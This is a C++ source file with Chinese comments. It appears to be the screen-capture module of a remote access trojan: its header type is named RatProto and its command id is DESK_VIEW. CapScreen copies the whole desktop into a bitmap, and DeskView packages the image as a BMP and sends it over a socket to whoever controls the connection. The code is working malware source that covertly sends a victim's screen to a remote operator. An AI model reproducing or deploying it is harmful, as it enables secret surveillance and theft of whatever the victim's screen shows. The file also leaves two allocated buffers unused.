#include "DeskView.h"


//////////////////////////////////////////////////////////////////////////
//远程桌面捕获
//////////////////////////////////////////////////////////////////////////
BOOL DeskView(SOCKET sockfd)
{
	HBITMAP hBitmap = CapScreen();

	//屏幕显示DC
	HDC hDC = CreateDC("DISPLAY",NULL,NULL,NULL); 
	//颜色平面数×色彩位数 = 当前分辨率下每个像素所占字节数  
	int iBits = GetDeviceCaps(hDC, BITSPIXEL) *GetDeviceCaps(hDC, PLANES);  
	DeleteDC(hDC);

	//位图中每个像素所占字节数 
	WORD   wBitCount;      
	if (iBits <= 1)
		wBitCount = 1;
	else if (iBits <= 4)
		wBitCount = 4;
	else if (iBits <= 8)
		wBitCount = 8;
	else if (iBits <= 24)
		wBitCount = 24;
	else
		wBitCount = iBits;
	//调色板大小， 位图中像素字节大小
	DWORD   dwPaletteSize=0;	 
	if (wBitCount <= 8)		
		dwPaletteSize = (1 << wBitCount) *	sizeof(RGBQUAD);	
	
	//位图属性结构
	BITMAP  bm;        
	GetObject(hBitmap, sizeof(bm), (LPSTR)&bm);  

	//位图信息头结构 
	BITMAPINFOHEADER   bi,bi1;           
	bi.biSize            = sizeof(BITMAPINFOHEADER);  
	bi.biWidth           = bm.bmWidth;
	bi.biHeight          = bm.bmHeight;
	bi.biPlanes          = 1;
	bi.biBitCount        = wBitCount;
	//BI_RGB表示位图没有压缩
	bi.biCompression     = BI_RGB; 
	bi.biSizeImage       = 0;
	bi.biXPelsPerMeter   = 0;
	bi.biYPelsPerMeter   = 0;
	bi.biClrUsed         = 0;
	bi.biClrImportant    = 0;
	bi1=bi;
	bi1.biBitCount=24;

	DWORD dwBmBitsSize = ((bm.bmWidth * wBitCount+31)/32) * 4 * bm.bmHeight;    
	//为位图内容分配内存
	HANDLE hDib  = GlobalAlloc(GHND,dwBmBitsSize + dwPaletteSize + sizeof(BITMAPINFOHEADER));  
	LPBITMAPINFOHEADER lpbi = (LPBITMAPINFOHEADER)GlobalLock(hDib);
	*lpbi = bi;
	// 处理调色板
	HANDLE hPal = GetStockObject(DEFAULT_PALETTE);   
	HANDLE  hOldPal=NULL; 
	if (hPal)
	{
		hDC = GetDC(NULL);
		hOldPal = SelectPalette(hDC,(HPALETTE)hPal, FALSE);
		RealizePalette(hDC);
	}
	int nOutputBytes = 0;
	unsigned char *pJpp,*m_pDibBits;
	pJpp = new unsigned char [dwBmBitsSize];
	m_pDibBits = new unsigned char [dwBmBitsSize];
	//GetDIBits(hDC, hBitmap, 0, (UINT) bm.bmHeight,m_pDibBits,(BITMAPINFO*)lpbi,DIB_RGB_COLORS);
	GetDIBits(hDC, hBitmap, 0, (UINT) bm.bmHeight,(LPSTR)lpbi + sizeof(BITMAPINFOHEADER)+dwPaletteSize,(BITMAPINFO*)lpbi,DIB_RGB_COLORS);// 获取该调色板下新的像素值
	//恢复调色板
	if (hOldPal)
	{
		SelectPalette(hDC, (HPALETTE)hOldPal, TRUE);
		RealizePalette(hDC);
		::ReleaseDC(NULL, hDC);
	}

	//位图文件头结构  
	BITMAPFILEHEADER   bmfHdr;    
	// "BM" 
	bmfHdr.bfType = 0x4D42;   
	// 设置位图文件头
	DWORD dwDIBSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwPaletteSize + dwBmBitsSize;  
	bmfHdr.bfSize = dwDIBSize;
	bmfHdr.bfReserved1 = 0;
	bmfHdr.bfReserved2 = 0;
	bmfHdr.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER) + dwPaletteSize;

	//HANDLE hFile = CreateFile(strFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);//创建位图文件   
	//DWORD dwWritten;
	//WriteFile(hFile, (LPSTR)&bmfHdr, sizeof(BITMAPFILEHEADER), &dwWritten, NULL);	// 写入位图文件头
	//WriteFile(hFile, (LPSTR)lpbi, dwDIBSize, &dwWritten, NULL);// 写入位图文件其余内容

	RatProto ratPro;
	ratPro.RatId = DESK_VIEW;
	ratPro.RatLen = sizeof(BITMAPFILEHEADER)+sizeof(RatProto)+dwDIBSize;
	//发送协议头
	SendCmd(sockfd,(char*)(&ratPro),sizeof(RatProto));
	//发送BMP头
	SendCmd(sockfd,(char*)(&bmfHdr),sizeof(BITMAPFILEHEADER));
	//发送BMP内容
	SendCmd(sockfd,(char*)lpbi,dwDIBSize);

	GlobalUnlock(hDib);   //清除   
	GlobalFree(hDib);
	//CloseHandle(hFile); 
	delete []pJpp;
	delete []m_pDibBits;

	return TRUE;
}



//////////////////////////////////////////////////////////////////////////
//Capture Screen
//////////////////////////////////////////////////////////////////////////
HBITMAP CapScreen()
{
	//桌面HWND
	HWND hDesk = GetDesktopWindow();
	//桌面HDC
	HDC hScreenDC = GetDC(hDesk);
	//CreateCompatibleDC创建一个显示表面仅存在于内存中的DC
	HDC hMemDc = CreateCompatibleDC(hScreenDC);
	RECT stRect;
	GetWindowRect(hDesk,&stRect);
	HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC,stRect.right-stRect.left,stRect.bottom-stRect.top);
	HGDIOBJ hOldBmp =  SelectObject(hMemDc,hBitmap);
	BitBlt(hMemDc,0,0,stRect.right-stRect.left,stRect.bottom-stRect.top,hScreenDC,stRect.left,stRect.top,SRCCOPY);
	SelectObject(hMemDc,hOldBmp);
	DeleteObject(hMemDc);
	ReleaseDC(hDesk,hScreenDC);

	return hBitmap;
}